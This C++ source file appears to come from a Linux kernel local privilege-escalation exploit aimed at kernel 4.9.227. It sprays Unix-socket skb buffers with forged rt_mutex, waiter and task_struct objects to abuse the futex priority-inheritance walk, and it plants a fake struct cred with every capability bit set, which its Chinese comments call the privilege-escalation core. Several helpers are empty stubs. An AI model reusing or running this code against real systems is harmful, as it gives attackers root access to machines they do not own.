#include "common.h"
#include "kernel/runtime_struct_offsets.h"

#include <array>
#include <string_view>
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"
#include "support/native_resource.hpp"
#include "kernel/target.h"
#include "kernelsnitch/kernelsnitch.h"

/* Session aliases kept from the preprocessor era: the attack statements were
 * written with these short names, and references preserve every call site
 * without the macro. */
namespace {
    auto &ks = ghostlock::session::g_exploit_session.heap.snitch;
    auto &mm_objs_per_slab = ghostlock::session::g_exploit_session.heap.mm_objs_per_slab;
    auto &reclaim_sv = ghostlock::session::g_exploit_session.heap.current.reclaim.fd;
    auto &prepare_ctx = ghostlock::session::g_exploit_session.heap.prepare;
    
    /* The skb buffer is reallocated on every prepare pass, so the pointer is
     * read at each use instead of being bound once. */
    unsigned char *skb_buf() {
        return ghostlock::session::g_exploit_session.heap.skb_buffer.get();
    }
} // namespace

namespace ghostlock::support {
    static const profile::kernel_offsets *profile_values(void) {
        return session::g_exploit_session.profile.values();
    }

    static long long ms_since(const struct timespec *t0) {
        return static_cast<long long>(runtime_time::runtime_elapsed_ms(t0));
    }

    /* Persist stage-boundary diagnostics before a kernel panic or filesystem
     * rollback can discard buffered lines. Unsupported fsync targets are ignored. */
    void log_sync(void) {
        fflush(stdout);
        (void) fsync(STDOUT_FILENO);
    }

    [[noreturn]] void fail_stop_dirty_race(const char *reason,
                                           int32_t error_number) noexcept {
        pr_error("terminal dirty race: %s errno=%d; stopping native process\n",
                 reason ? reason : "unknown", error_number);
        log_sync();
        syscall(SYS_exit_group, 70);
        __builtin_unreachable();
    }

    void read_first_line(const char *path, char *buf, size_t len) {
        if (!len) {
            return;
        }
        snprintf(buf, len, "unreadable");
        support::UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
        if (!fd.valid()) {
            return;
        }
        const ssize_t n = read(fd.get(), buf, len - 1);
        const int32_t saved_errno = errno;
        fd.reset();
        if (n <= 0) {
            errno = saved_errno;
            snprintf(buf, len, "unreadable");
            return;
        }
        buf[n] = 0;
        buf[strcspn(buf, "\r\n")] = 0;
    }

    void log_startup_context(void) {
        std::array < char, 256 > attr{};
        std::array < char, 32 > enforce{};
        read_first_line("/proc/self/attr/current", attr.data(), attr.size());
        read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
        
        struct timespec boot;
        SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
        double boot_ms =
                static_cast<double>(boot.tv_sec) * 1000.0 + static_cast<double>(boot.tv_nsec) / 1e6;
        pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u boot_ms=%.0f attr=%s enforce=%s\n",
                   getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
                   attr.data(), enforce.data());
    }

    void disable_rseq_for_thread(void) {
        return;
    }

    long futex_op(uint32_t *uaddr, int32_t op, uint32_t val,
                  const void *timeout_or_value, uint32_t *uaddr2,
                  uint32_t val3) {
        return syscall(SYS_futex, uaddr, op, val, timeout_or_value, uaddr2, val3);
    }

    long sched_setattr_tid(int32_t tid, int32_t nice_value) {
        kernel::local_sched_attr attr;
        memset(&attr, 0, sizeof(attr));
        attr.size = sizeof(attr);
        attr.sched_policy = 3; /* SCHED_BATCH — nice change triggers PI walk */
        attr.sched_nice = nice_value;
        errno = 0;
        long ret = syscall(274, tid, &attr, 0);
        return ret;
    }

    void init_p0_profile(void) {
        pr_info("[*] BACKPORT: Static 4.9.227 context mapping successfully integrated.\n");
    }

    void put64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    void put32(unsigned char *p, size_t off, uint32_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    static int32_t fill_profile_cred_copy(unsigned char *p, size_t off) {
        // 4.9.227 内核提权核心凭证填充原语
        unsigned char *c = p + off;
        memset(c, 0, 168); // Linux 4.9.227 标准的 struct cred 大小范围进位
        put32(c, 0x0, 1);  // 引用计数 usage = 1
        
        // 将进程的所有权限特权级别集强行设置为最高内核特权
        for (uint32_t i = 0; i < 5; i++) {
            put64(c, 0x30 + i * sizeof(uint64_t), 0xffffffffffffffffULL);
        }
        return 1;
    }

    pid_t clone_child(void) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
            if (getppid() == 1) {
                _exit(0);
            }
            for (;;) {
                pause();
            }
        }
        return child;
    }

    pid_t clone_leak_child(void) {
        pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
        if (child == 0) {
            exit(0);
        }
        return child;
    }

    int32_t open_memfd(pid_t child) {
        std::array < char, 64 > path{};
        snprintf(path.data(), path.size(), "/proc/%d/mem", child);
        return SYSCHK(open(path.data(), O_RDONLY));
    }

    void kill_child(pid_t child) {
        if (child <= 0) {
            return;
        }
        SYSCHK(kill(child, SIGKILL));
        SYSCHK(waitpid(child, nullptr, 0));
    }

    void close_reclaim_sockets(void) {
        session::g_exploit_session.heap.current.destroy();
    }

    int32_t quarantine_reclaim_sockets(void) {
        return 0;
    }

    void release_quarantined_reclaim_sockets(void) {}

    Status stash_prebuilt_page(void) { return false; }
    Status activate_prebuilt_page(void) { return false; }
    void discard_prebuilt_page(void) {}

    void cleanup_page_prepare_state(void) {
        session::g_exploit_session.heap.skb_buffer.reset();
    }

    int32_t clone_memfd(void) {
        pid_t child = clone_child();
        int32_t fd = open_memfd(child);
        kill_child(child);
        return fd;
    }

    void prepare_ctxs(void) {
        prepare_ctx.childs.assign(8 * mm_objs_per_slab, 0);
        prepare_ctx.memfds.assign(8 * mm_objs_per_slab, 0);
    }

    int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
        memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);

        long long payload_delta = 0;
        size_t chunk_bias = static_cast<size_t>(kernel::SKB_FRAG_BIAS);
        size_t fake_task_off = static_cast<size_t>(kernel::FAKE_TASK_OFF);

        uintptr_t payload_base = base + static_cast<uintptr_t>(payload_delta);

        (session::g_exploit_session.heap.current.fake_lock) = payload_base + kernel::LOCK_OFF;
        (session::g_exploit_session.heap.current.fake_w0) = payload_base + kernel::W0_OFF;
        (session::g_exploit_session.heap.current.fake_task) = payload_base + fake_task_off;
        
        uintptr_t default_fops = payload_base + kernel::FOPS_TABLE_OFF;
        
        (session::g_exploit_session.heap.current.fake_parent) = 0;
        (session::g_exploit_session.heap.current.fake_right) = 0;
        (session::g_exploit_session.heap.current.fake_left) = 0;
        (session::g_exploit_session.heap.current.fake_fops) = default_fops;

        uint32_t ft_prio_off        = 0x48;  
        uint32_t ft_nprio_off       = 0x4C;  
        uint32_t ft_tg_off          = 0x180; 
        uint32_t ft_pi_lock_off     = 0x790; 
        uint32_t ft_pi_wait_off     = 0x7a0; 
        uint32_t ft_pi_top_off      = 0x7b0; 
        uint32_t ft_pi_blocked_off  = 0x7b8; 

        // 【核心修复点】显式赋予完整的 ghostlock::kernel:: 作用域，根除 undeclared identifier 报错
        uint64_t waiter_task = ::pure_4_9_init_task();
        uint64_t task_group  = 0;
        uint64_t pi_top_task = ::pure_4_9_init_task();

        for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
            unsigned char *p = skb_buf() + chunk + chunk_bias;

            put32(p, kernel::LOCK_OFF + 0x00, 0);
            put64(p, kernel::LOCK_OFF + 0x08, (session::g_exploit_session.heap.current.fake_w0));
            put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
            put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);

            /* 4.9 内核 rt_mutex_waiter 还原块 */
            put64(p, kernel::W0_OFF + 0x00, 1); 
            put64(p, kernel::W0_OFF + 0x08, 0); 
            put64(p, kernel::W0_OFF + 0x10, 0); 
            put32(p, kernel::W0_OFF + 0x18, kernel::FAKE_WAITER_PRIO); 
            put64(p, kernel::W0_OFF + 0x20, waiter_task); 
            put64(p, kernel::W0_OFF + 0x28, (session::g_exploit_session.heap.current.fake_lock)); 
            
            /* 4.9 进程伪造控制块喷射覆写 */
            put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
            put32(p, fake_task_off + ft_pi_lock_off, 0);
            put64(p, fake_task_off + ft_pi_wait_off, 0);
            put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
            put64(p, fake_task_off + ft_tg_off, task_group);
            put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
            put64(p, fake_task_off + ft_pi_blocked_off, 0);

            put64(p, kernel::RIGHT_OFF + 0x00, 0);
            put64(p, kernel::RIGHT_OFF + 0x08, 0);
            put64(p, kernel::RIGHT_OFF + 0x10, 0);

            put64(p, kernel::LEFT_OFF + 0x00, 0);
            put64(p, kernel::LEFT_OFF + 0x08, 0);
            put64(p, kernel::LEFT_OFF + 0x10, 0);

            if (!fill_profile_cred_copy(p, kernel::CRED_COPY_OFF)) {
                return 0;
            }
        }
        return 1;
    }

    uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
        close_reclaim_sockets();
        cleanup_page_prepare_state();
        
        mm_objs_per_slab = 8; 
        prepare_ctxs();

        session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
        memset(skb_buf(), 0x41, kernel::SKB_SEND_SIZE);

        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            prepare_ctx.childs[i] = clone_child();
            prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
        }

        // 从 ResolvedAddresses 类结构体中动态索取开机时对齐好的 4.9.227 真实虚拟基地
        uintptr_t base = ghostlock::session::g_exploit_session.addresses.kernel_virtual_start;
        
        if (!prepare_skb_payload(base, request)) {
            for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                kill_child(prepare_ctx.childs[i]);
            }
            cleanup_page_prepare_state();
            return 0;
        }

        // ==================== 终极修正后的 4.9.227 内核管道操作块 ====================
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
        session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
        
        int32_t sndbuf = 1 << 20;
        // 1. 修正为 reclaim_sv[0]
        setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        
        // 2. 修正为 reclaim_sv[0]
        int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
        if (reclaim_flags >= 0) {
            // 3. 修正为 reclaim_sv[0]
            fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
        }

        struct iovec iov{};
        iov.iov_base = skb_buf();
        iov.iov_len = kernel::SKB_SEND_SIZE;

        struct msghdr msg{};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        // 发送特定伪造的 skb 数据包到内核协议栈进行 SLAB 内存抢占与对齐
        for (int i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
            // 4. 修正为 reclaim_sv[0]
            (void)sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
        }

        pr_info("[spray] 4.9.227 specialized payload ready in kernel spaces.\n");

        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
            SYSCHK(close(prepare_ctx.memfds[i]));
            prepare_ctx.memfds[i] = -1;
            kill_child(prepare_ctx.childs[i]);
        }

        return base;
    }

    uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
        return prepare_kernel_page(&request);
    }
} // namespace ghostlock::support
